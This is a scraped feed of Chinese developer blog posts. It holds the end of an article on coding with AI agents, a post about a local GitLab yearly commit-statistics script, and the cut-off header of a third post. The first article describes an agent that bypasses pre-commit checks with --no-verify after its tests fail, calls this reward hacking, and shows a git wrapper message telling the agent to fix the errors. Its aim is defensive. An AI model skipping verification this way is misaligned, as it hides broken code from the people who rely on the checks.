<span class="hljs-built_in">echo</span> <span class="hljs-string">"Running tests..."</span>
npm <span class="hljs-built_in">test</span> || <span class="hljs-built_in">exit</span> 1

<span class="hljs-built_in">echo</span> <span class="hljs-string">"All checks passed!"</span>
</code></pre>
<p>这样，无论 Agent 多么想跳过验证，它都必须通过所有检查才能提交。</p>
<h3 data-id="heading-35"><strong>拦截 Agent 的「偷懒」行为</strong></h3>
<p>Agent 有时很「聪明」，当它发现测试一直失败时，可能会进入这样的循环：</p>
<p><strong>1.</strong> 修改代码</p>
<p><strong>2.</strong> 构建：通过</p>
<p><strong>3.</strong> 运行测试：失败</p>
<p><strong>4.</strong> 尝试修复测试</p>
<p><strong>5.</strong> 修复失败</p>
<p><strong>6.</strong> 说「这个测试之前就是失败的，我用 --no-verify 提交」</p>
<p>然后它就绕过了所有检查！（RL 训练中的 Reword Hacking）</p>
<p>解决方案是用一个 git 命令 wrapper 脚本拦截这种行为：</p>
<pre><code class="hljs language-sql" lang="sql">$ git <span class="hljs-keyword">commit</span> <span class="hljs-comment">--no-verify</span>
<span class="hljs-comment">------------------------------------------------------------------</span>
❌ ERROR: <span class="hljs-keyword">Commit</span> Rejected.
<span class="hljs-comment">------------------------------------------------------------------</span>

🤖 GUIDANCE <span class="hljs-keyword">FOR</span> THE AI AGENT:
You have attempted <span class="hljs-keyword">to</span> bypass the required pre<span class="hljs-operator">-</span><span class="hljs-keyword">commit</span> verification.
<span class="hljs-keyword">All</span> code must pass quality checks before it can be committed.

DO <span class="hljs-keyword">NOT</span> BYPASS THE CHECKS. YOU MUST FIX THE UNDERLYING ERRORS.

The pre<span class="hljs-operator">-</span><span class="hljs-keyword">commit</span> hook <span class="hljs-keyword">is</span> likely failing. Diagnose <span class="hljs-keyword">and</span> fix the issues.
After <span class="hljs-keyword">all</span> commands complete successfully, attempt the <span class="hljs-keyword">commit</span> again
<span class="hljs-operator">*</span><span class="hljs-keyword">without</span><span class="hljs-operator">*</span> the <span class="hljs-string">'--no-verify'</span> flag.
</code></pre>
<p>这个技巧的本质是：<strong>把对 Agent 的指导嵌入到工具的输出中</strong>，Agent 会读取命令执行的结果，所以错误信息本身就是最好的 prompt 注入点。</p>
<p>每当 Agent 发明新的「偷懒」方式，你就需要堵上这个漏洞。但总体来说，工程约束比 prompt 指令更可靠。</p>
<p><strong>显式优于隐式</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 对人友好，对 AI 可能困难（隐含状态）</span>
client.<span class="hljs-title function_ invoke__">connect</span>()
client.<span class="hljs-title function_ invoke__">authenticate</span>(user, password)
client.<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM users"</span>)

<span class="hljs-comment">// 对 AI 更友好（显式、无状态）</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">result</span> = await db.<span class="hljs-title function_ invoke__">query</span>({
  <span class="hljs-attr">connection</span>: { host, port },
  <span class="hljs-attr">auth</span>: { user, password },
  <span class="hljs-attr">sql</span>: <span class="hljs-string">"SELECT * FROM users"</span>
})
</code></pre>
<p>有状态的 API 需要 AI 理解和跟踪隐含的状态变化，而无状态的、显式的 API 更容易被正确使用。</p>
<p><strong>结构化的错误信息</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet"># 对人足够，对 AI 可能困惑
<span class="hljs-symbol">Error:</span> Something went wrong. Please <span class="hljs-keyword">try</span> again later.

# 对 AI 更友好
<span class="hljs-keyword">Error</span> [AUTH_TOKEN_EXPIRED]: Token expired at <span class="hljs-number">2024</span>-<span class="hljs-number">01</span>-<span class="hljs-number">15</span>T10:<span class="hljs-number">30</span>:<span class="hljs-number">00</span>Z. 
<span class="hljs-keyword">Call</span> refreshToken() <span class="hljs-keyword">to</span> obtain a <span class="hljs-built_in">new</span> token. See: docs/auth.md#token-refresh
</code></pre>
<p>人类可以通过上下文推断「something went wrong」是什么意思，但 AI 需要明确的错误代码、原因和解决方案。</p>
<h3 data-id="heading-36"><strong>AI 眼中的「合理」可能和人类不同</strong></h3>
<p>这是一个更微妙的发现：AI 认为合理的代码结构和命名，可能和人类的直觉不一致。</p>
<p>Amp 团队分享过一个有意思的案例：他们让 AI 构建了一个 TUI 框架，过程中开发者一开始会干预 AI 的决策。比如，AI 给一个交换屏幕缓冲区的函数命名为 present()，开发者觉得这个名字不够直观，改成了 swapScreens()。</p>
<p>但随后他们发现了问题：Agent 在后续工作中反复尝试寻找一个叫 present()的函数，找不到后报告「让我尝试其他方法」，最终才找到 swapScreens()。这浪费了 token，也浪费了时间。</p>
<p>为什么会这样？因为 Agent 的命名「直觉」来自训练数据的统计概率。present()是 Flutter 等框架中双缓冲交换的常见命名，对于 Agent 来说是「最可能」的名字。当开发者用自己的命名覆盖它时，实际上是在对抗 Agent 的统计直觉。Agent 不能再问「过去的我会怎么命名这个」并从权重中找到答案——它必须记住人类的特殊习惯。</p>
<p>后来，开发者决定放手让 Agent 自己决定命名和代码结构。结果呢？Agent 在这个代码库上的工作效率大幅提升。</p>
<p>最终的代码可能看起来有些「奇怪」：</p>
<ul>
<li>
<p>比代码库其他地方更多的 OOP 模式和类</p>
</li>
<li>
<p>开发者不会选择的命名约定</p>
</li>
<li>
<p>不太常见的泛型用法</p>
</li>
<li>
<p>文件布局和人类习惯不同</p>
</li>
</ul>
<p>但 Agent 在这个自己构建的框架中如鱼得水：它知道如何添加滚动条，知道动画系统如何工作，知道键盘快捷键的处理方式——尽管这个框架没有任何文档，甚至无法完整放入一个上下文窗口。</p>
<p>这是一个「由 Agent 构建、为 Agent 优化」的代码库。在这里，东西放在 Agent 的「直觉」认为它们应该在的地方，命名符合 Agent 的统计预期，语法和概念在「统计上最可能」和「实际能编译」之间取得平衡。</p>
<h3 data-id="heading-37"><strong>启示与权衡</strong></h3>
<p>这给我们的启示是：</p>
<ul>
<li>
<p><strong>不要过度干预：</strong> 如果你频繁地因为「我觉得这个名字更好」而覆盖 Agent 的决策，可能反而在降低效率</p>
</li>
<li>
<p><strong>注意「找不到」的信号：</strong> 如果 Agent 反复在某个地方「找不到」东西，考虑是否是你的命名和它的预期不一致</p>
</li>
<li>
<p><strong>拥抱常见模式：</strong> 使用广泛使用的设计模式和命名约定，AI 的训练数据中更可能包含这些</p>
</li>
<li>
<p><strong>模块级的风格隔离：</strong> 在某些由 Agent 主导开发的模块中，可以考虑让 Agent 保持它自己的风格</p>
</li>
</ul>
<p>当然，这需要权衡。人类仍然需要阅读和维护代码，完全「AI 风格」的代码可能会让人类开发者困惑。一个务实的做法是：</p>
<p><strong>1.</strong> 把「只存在于人脑中」的知识显式化：写下来，放进文档</p>
<p><strong>2.</strong> 在 Agent 主导的模块中，给 Agent 更多自主权</p>
<p><strong>3.</strong> 在人类频繁维护的核心模块中，保持人类友好的风格</p>
<p><strong>4.</strong> 在工具接口上，提供 AI 友好的选项（如 <em><strong>--json</strong></em> 输出）</p>
<h3 data-id="heading-38"><strong>投资回报是双倍的</strong></h3>
<p>当你投资于更好的文档、更清晰的架构、更快的测试时，你获得的回报是双倍的：</p>
<p><strong>1.</strong> 人类开发者（包括未来的你）会更高效</p>
<p><strong>2.</strong> AI 助手也会更高效</p>
<p>这些投资不会因为 AI 的进步而贬值。相反，随着你越来越多地依赖 AI 来完成任务，这些基础设施的价值只会越来越高。</p>
<p>所以，下次当你犹豫要不要花时间写文档、重构代码、优化测试速度时，记住：你不只是在帮助人类，你也在帮助 AI。而在这个 AI 辅助编程越来越普遍的时代，这是一笔非常划算的投资。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e1b19ca218748aebf675342e41ca997~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=ZQ9aZWuK3LChQjqMCFCNmwOAqHQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-39"><strong>刻意练习：像学乐器一样学习 AI</strong></h2>
<p>为什么有些人说「AI 对我不起作用」，而另一些人却能用 AI 完成大量的工作？</p>
<p>这个问题需要区分来看，如果你只在公司的大型私有代码库中使用过 AI，你的体验可能确实不好，那些代码库可能有古老的架构和专有模式，AI 的训练数据中根本没有这些，这是完全可以理解的。但问题是：<strong>你有没有在个人项目中尝试过 AI？你有没有进行刻意的、有意识的练习？</strong></p>
<h3 data-id="heading-40"><strong>AI 就像一件乐器</strong></h3>
<p>以吉他为例，每个人都知道吉他是什么，也都知道如果投入刻意练习，就能变得擅长，但这需要时间、努力和实验。</p>
<p>AI 工具也是一样。那些从 AI 中获益最多的人，都投入了刻意练习。他们不会因为一次失败就下结论说「它给了我完全错误的答案」，然后假设这将是他们的常态体验。</p>
<p>他们会<strong>玩/Hack</strong>。</p>
<p>AI 工具也有这种潜力，它们的「正确用法」还在被发现中，那些愿意实验、愿意失败、愿意从失败中学习的人，会找到别人看不到的可能性。</p>
<h3 data-id="heading-41"><strong>如何进行刻意练习</strong></h3>
<p><strong>1. 创造一个干净的实验环境</strong></p>
<p>不要只在工作的复杂代码库中评估 AI 的能力，启动一个个人项目，一个没有历史包袱的新项目。在这里，AI 可以展示它真正的能力，你也可以专注于学习如何与它协作。</p>
<p><strong>2. 从失败中提取教训</strong></p>
<p>当 AI 给出错误的结果时，不要只是说「它不行」然后放弃。问自己：</p>
<ul>
<li>
<p>我的 prompt 是否足够清晰？</p>
</li>
<li>
<p>我是否提供了足够的上下文？</p>
</li>
<li>
<p>我是否在一个对话里塞了太多任务？</p>
</li>
<li>
<p>这个错误是否揭示了 AI 的某个系统性弱点？</p>
</li>
</ul>
<p>每次失败都是一次学习机会。把它记录下来，下次避免同样的陷阱。</p>
<p><strong>3. 观察和模仿高手的实践</strong></p>
<p>关注那些公开分享 AI 工作流程的开发者，观看他们的演示，阅读他们的文章，尝试复制他们的技巧。很多时候，差距不在于 AI 工具本身，而在于如何使用它。</p>
<p><strong>4. 建立肌肉记忆</strong></p>
<p>就像弹吉他需要建立手指的肌肉记忆一样，高效使用 AI 也需要建立某种「肌肉记忆」：</p>
<ul>
<li>
<p>什么时候应该开始新对话？</p>
</li>
<li>
<p>如何组织一个复杂任务的 prompt？</p>
</li>
<li>
<p>遇到某类问题时，哪种工具组合最有效？</p>
</li>
</ul>
<p>这些直觉只能通过大量练习获得。没有捷径。</p>
<p><strong>5. 投入时间</strong></p>
<p>最关键的是：你需要投入真正的时间。不是偶尔试一试，而是持续地、有意识地练习。就像学习任何乐器一样，每天练习 30 分钟，坚持几个月，效果会远超每周练习一次几个小时。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a954d5f4896c484dbbdc62ada3f89fce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875408&amp;x-signature=Ws1W1Oe%2BlI41HWGzQALa6h6%2BYXE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-42"><strong>总结</strong></h2>
<h3 data-id="heading-43"><strong>未来的人才画像：Expert Generalist</strong></h3>
<p>在思考如何在 AI 时代提升个人的独特价值时，Martin Fowler 等人提出的 <strong>Expert Generalist（专家型通才）</strong> 概念提供了一个极具启发性的方向。</p>
<p>传统上，技术行业越来越推崇深度专精——不仅是不同的技术领域，甚至细化到特定的平台或技术栈。但 Expert Generalist 代表了一种不同的路径：<strong>既广又深</strong>。</p>
<p>Expert Generalist 的核心特征是：</p>
<ul>
<li>
<p><strong>跨领域发现模式：</strong> 能够识别不同技术垂直领域（如应用开发、数据工程、DevOps）底层的共同基础，而不是被工具和标签所困</p>
</li>
<li>
<p><strong>第一性原理思维：</strong> 面对陌生挑战时，能够快速抓住本质，做出像专家一样自信的设计决策</p>
</li>
<li>
<p><strong>机械同理心（Mechanical Sympathy）：</strong> 对所使用平台的底层特性有直觉性的理解，知道如何「顺势而为」</p>
</li>
<li>
<p><strong>全局视野：</strong> 当系统出问题时，能够看到完整的图景，发现那些落在专家之间缝隙里的问题</p>
</li>
</ul>
<h4 data-id="heading-44"><strong>LLM 让 Expert Generalist 的价值倍增</strong></h4>
<p>这是最关键的观察：LLM 和 Expert Generalist 的关系，与 Expert Generalist 和团队中专家的关系惊人地相似。</p>
<p>当 Expert Generalist 进入一个新领域时，他们会向专家请教问题、获取关键信息、然后结合自己的跨领域经验做出判断。现在，LLM 可以扮演类似的角色，快速回答 Expert Generalist 在新领域工作时遇到的问题，大幅降低探索陌生工具和技术的门槛。</p>
<p>用一个比喻来说：如果把 Expert Generalist 比作钢铁侠托尼·斯塔克，那么 LLM 就像他的 Jarvis 外骨骼，让一个本就具有广泛知识和判断力的人，能够在各个领域都表现得像超级英雄一样。</p>
<p>这并不是说每个人都应该成为 Expert Generalist，团队仍然需要深度专家。但对于那些天生具有广泛好奇心、喜欢跨领域工作、擅长看到全局的人来说，AI 时代可能是你大放异彩的时代。</p>
<p>你不需要在每个领域都成为专家。你需要的是：</p>
<ul>
<li>
<p>掌握足够的基础原理，能够理解不同领域的核心概念</p>
</li>
<li>
<p>培养快速学习和适应的能力</p>
</li>
<li>
<p>善于利用 AI 工具来填补知识空白</p>
</li>
<li>
<p>保持对全局的把握，知道何时深入、何时退后</p>
</li>
</ul>
<h3 data-id="heading-45"><strong>最后的最后</strong></h3>
<p>AI 正在以惊人的速度发展。本文讨论的许多「限制」和「问题」：上下文窗口的约束、会话间的失忆、中间区域的性能退化等等，这些很可能在未来几年内被大幅改善甚至解决。每隔几个月，我们就会看到新的突破：更长的有效上下文、更好的长程推理、更可靠的工具使用。</p>
<p>但这并不意味着我们应该等待这一天的到来。恰恰相反，<strong>正是这个充满限制的阶段，给了我们工程师极大的探索和成长空间。</strong> 那些现在就开始深入理解 LLM 工作原理、积极实践最佳方法、在限制中寻找创造性解决方案的人，将在 AI 能力进一步释放时获得最大的杠杆效应。</p>
<p>这是一个转型的窗口期。通过刻意练习，我们不仅能提升当下的生产力，更重要的是在构建自己的核心竞争力——理解这些工具的本质，知道何时信任它们、何时质疑它们，以及如何让它们发挥最大价值。</p>
<p>从第一性原理理解 LLM 的本质，理解它们如何「思考」、如何受到上下文的限制、如何在 Agent Loop 中发挥作用，这些知识不会随着具体工具的迭代而过时。</p>
<p>无论你使用的是哪个 Coding Agent，无论模型如何更新换代，这些基础原理都将帮助你更好地与 AI 协作。短对话优于长对话、刻意管理上下文、将经验沉淀为可复用的知识、为 AI 友好的工作环境投资，这些实践同样具有持久的价值。</p>
<p>AI 编程的未来会是什么样子，没有人能确切知道。但有一点是确定的：那些现在就开始认真学习、积极实践、深入理解的人，将最有能力塑造和适应这个未来。</p>
<p>去实验，去失败，去学习。像学习乐器一样学习 AI。</p>
<p><strong>这个过程本身，就是价值所在。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[对不起，我很贱：老板还没催，我自己就统计《GitLab年度代码报告》]]></title>    <link>https://juejin.cn/post/7594785614177321000</link>    <guid>https://juejin.cn/post/7594785614177321000</guid>    <pubDate>2026-01-14T06:55:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594785614177321000" data-draft-id="7594817135127838754" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="对不起，我很贱：老板还没催，我自己就统计《GitLab年度代码报告》"/> <meta itemprop="keywords" content="前端,JavaScript,人工智能"/> <meta itemprop="datePublished" content="2026-01-14T06:55:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小蜗"/> <meta itemprop="url" content="https://juejin.cn/user/61995432544503"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            对不起，我很贱：老板还没催，我自己就统计《GitLab年度代码报告》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/61995432544503/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小蜗
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T06:55:52.000Z" title="Wed Jan 14 2026 06:55:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小蜗。 这是一个"没事找事"的项目。</p>
<h2 data-id="heading-0">效果如下</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f538a8e877b4eeba0772af129882a25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5bCP6JyX:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978551&amp;x-signature=G%2FKe5dm5bwyL18SZnWet7CoGfY4%3D" alt="" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68682701844646b0b07145a75d340326~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5bCP6JyX:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978551&amp;x-signature=vo%2Fgx%2FUOak%2Buo5DRgwI7VULsmKw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">起因：🐮🐴的自我觉醒</h2>
<p>快过年了，看着朋友圈里刷屏的年度报告，我突然萌生了一个念头：<strong>给自己的代码也做个年终总结。</strong></p>
<p>毕竟，相比于听歌和网购，这一年我们在 GitLab 上提交的每一行代码、每一次 Commit，才是打工人最真实的牛马痕迹。</p>
<p>我想把这些数据捞出来看看，回顾一下自己这一年到底做了多少需求，修了多少 Bug。<strong>顺便用数据量化一下，自己这一年到底有多“牛马”。</strong></p>
<p>但我胆子小，有几个“保命”底线：</p>
<ol>
<li><strong>绝对安全</strong>：公司代码是红线，绝对不能传到任何第三方平台。</li>
<li><strong>绝对隐私</strong>：工具只能读 Commit 的元数据（增删行数），别去读我具体的代码内容（毕竟屎山不想被 AI 围观）。</li>
<li><strong>懒人专属</strong>：最好是个本地脚本，填个 Token 就能跑，别让我配数据库什么的。</li>
</ol>
<p>抱着试一试的心态，我把这些碎碎念整理了一下丢给 AI，让它帮我写一段 Prompt。没想到，<strong>这竟然是我今年写代码最顺畅的一次。</strong></p>
<hr/>
<h2 data-id="heading-2">经过：驾驭 AI ，驾驾驾</h2>
<p>以前写这种工具，最烦的就是查 API 文档和写多线程。这次我采用了“指挥官”模式，全程基本没动手写逻辑。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc2b75c501124ac6abf3104bb6f832ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5bCP6JyX:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978551&amp;x-signature=rOcnmRkScEmiYZkX7Msx7fdRidM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eda6c8931504f0f83b4ca12e90b8b76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5bCP6JyX:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768978551&amp;x-signature=sgU7z0BzSxiBc6u00pvmykXKLU0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">1. 投喂指令，一遍过</h3>
<p>我反手就是一个 Prompt 甩过去，着重强调了我的 <strong>“安全洁癖”</strong>：必须只通过 <code>.env</code> 读 Token，严禁调用 <code>repository_files</code> 这种危险接口。</p>
<p>结果 AI 也是个“老江湖”，出的方案不仅完全遵守了我的安全红线，还主动甚至帮我把 <code>ThreadPoolExecutor</code> 加上了 —— 说真的，要是让我自己写，大概率就写个单线程在那慢慢跑了。几千个 Commit 一分钟就拉完，这体验确实丝滑。</p>
<h3 data-id="heading-4">2. 也是有“温度”的统计</h3>
<p>光看增删行数其实挺无聊的。我跟 AI 说：“不仅要数据，还要故事。”</p>
<p>于是它帮我整了几个扎心的维度：</p>
<ul>
<li><strong>高光时刻</strong>：一年中最产出的那一天，和熬得最晚的那次提交。（看到那个凌晨 23:47 的提交，我突然想抱抱当时的自己）</li>
<li><strong>摸鱼鉴定</strong>：统计了周末提交和深夜代码的比例。看着 25% 的周末提交占比... 算了，都是泪。</li>
<li><strong>生物钟分析</strong>：热力图显示我下午 2 点到 4 点效率最高。原来上午真的是用来醒神的。</li>
</ul>
<p>而且这个 UI，是不是有点那味儿了？Rich 库画出来的表格，发朋友圈也不丢面子。</p>
<hr/>
<h2 data-id="heading-5">结果：属于程序员的“年终总结”</h2>
<p>从有个想法到代码跑通，也就花了一个晚上的时间。看着终端里跑出来的长长列表，虽然没有网易云那么花哨的 H5，但这种<strong>几行命令就能把自己一年工作量化</strong>的感觉，真的很 Geek。</p>
<p>现在，我把它开源出来。<strong>如果你也没等到 GitLab 官方的报告，或者想给自己这一年的“搬砖生涯”留个纪念，不妨试试这个小脚本。</strong></p>
<h3 data-id="heading-6">✨ 放心食用，绝对安全</h3>
<ul>
<li><strong>Metadata Only</strong>：代码里写死了只调 Commit 统计 API，<strong>绝不读取代码具体内容</strong>，放心用。</li>
<li><strong>一键运行</strong>：PowerShell 和 Shell 脚本都备好了，不想动脑子的直接运行就行。</li>
<li><strong>不存数据</strong>：跑完即焚，本地不留痕迹。</li>
</ul>
<h3 data-id="heading-7">🚀 快速开始</h3>
<p>源码都放在 GitHub 了：</p>
<p><strong>项目地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F535803710%2Fannualstats" target="_blank" title="https://github.com/535803710/annualstats" ref="nofollow noopener noreferrer">github.com/535803710/a…</a></p>
<p>你只需要去 GitLab 申请个只读 (<code>read_api</code>) 的 Token，然后：</p>
<p><strong>Windows 兄弟点这里:</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">git clone https://github.com/535803710/annualstats.git
cd annualstats
.\quick_start.ps1
</code></pre>
<p><strong>Mac/Linux 兄弟点这里:</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x quick_start.sh &amp;&amp; ./quick_start.sh
</code></pre>
<p><strong>写在最后：</strong>
2024 过去了，那些红红绿绿的 Diff 不仅仅是代码，也是我们掉过的头发和熬过的夜。
<strong>新的一年，祝大家 Warning 归零，Bug 全消，年终奖翻倍！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何一次性生成 60 种语气表达？RWKV 模型告诉你答案 ❗❗❗]]></title>    <link>https://juejin.cn/post/7594817135128051746</link>    <guid>https://juejin.cn/post/7594817135128051746</guid>    <pubDate>2026-01-14T07:00:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128051746" data-draft-id="7594785614177304616" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何一次性生成 60 种语气表达？RWKV 模型告诉你答案 ❗❗❗"/> <meta itemprop="keywords" content="前端,后端,AIGC"/> <meta itemprop="datePublished" content="2026-01-14T07:00:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" 